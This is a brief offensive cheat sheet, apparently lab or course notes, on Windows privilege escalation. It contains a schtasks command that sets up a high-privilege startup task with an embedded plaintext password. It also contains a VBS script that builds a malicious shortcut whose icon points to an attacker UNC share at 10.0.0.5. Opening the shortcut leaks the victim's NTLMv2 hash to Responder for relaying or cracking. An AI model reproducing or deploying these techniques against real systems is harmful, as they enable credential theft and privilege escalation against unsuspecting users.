# Additional PrivEsc





# SCHEDULED TASKS

```powershell
schtasks /create /tn VulnTask /tr 'c:\MyPrograms\VulnerableTask\VulnTask.exe' /sc ONSTART /RL HIGHEST /RU "Student_adm" /RP "Threathunt25" /F
```

---

NTLM RELAYING

save the following as "mail_link.vbs", run it - it creates a malicious link that authenticates to responder sending its NTLMv2 hash.

```vbs
Set objShell = WScript.CreateObject("WScript.Shell")
Set lnk = objShell.CreateShortcut("evil_link.lnk")
lnk.TargetPath = "\\10.0.0.5\icon.ico" 	
lnk.Arguments = "" 		
lnk.Description = "" 	
lnk.IconLocation = "\\10.0.0.5\icon.ico" 
lnk.WorkingDirectory = "" 
lnk.Save
```

<https://github.com/AkuCyberSec/firefox-ntlm-hash-capture-via-lnk-download>